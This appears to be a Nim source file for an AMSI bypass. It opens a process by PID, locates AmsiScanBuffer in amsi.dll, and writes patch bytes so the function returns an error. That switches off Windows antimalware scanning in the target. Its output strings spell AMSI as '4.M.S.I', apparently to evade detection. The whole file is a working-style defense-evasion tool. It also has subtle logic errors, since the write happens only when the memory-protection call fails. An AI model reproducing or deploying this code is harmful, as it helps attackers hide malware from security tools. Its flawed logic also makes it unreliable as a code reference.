import dynlib
import winim
import os
import strutils

proc amsiPatchMemory(): bool =
    const
        Bytes: array[8, byte] = [byte 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc2, 0x18, 0x00]
    var
        res: WINBOOL
        LengBytes = cast[SIZE_T](Bytes.len)
        oldProtect: ULONG

    var Handler = OpenProcess(PROCESS_ALL_ACCESS, FALSE, cast[DWORD](parseInt(paramStr(1)))) 

    var AM = loadLib("amsi")
    if isNil(AM):
        return false

    var AmBuffer = AM.symAddr("AmsiScanBuffer")
    if isNil(AmBuffer):
        return false

    res = VirtualProtectEx(
        Handler,
        &AmBuffer,
        LengBytes,
        0x40, # PAGE_EXECUTE_READWRITE
        &oldProtect)

    if res == 0:
        WriteProcessMemory(Handler, AmBuffer, unsafeAddr Bytes, LengBytes, NULL)
        echo "Applied 4.M.S.I patch"
        return true
    return false

when isMainModule:
    if amsiPatchMemory():
        echo "[+] 4.M.S.I disabled!"
    else:
        echo "[!] Failed"
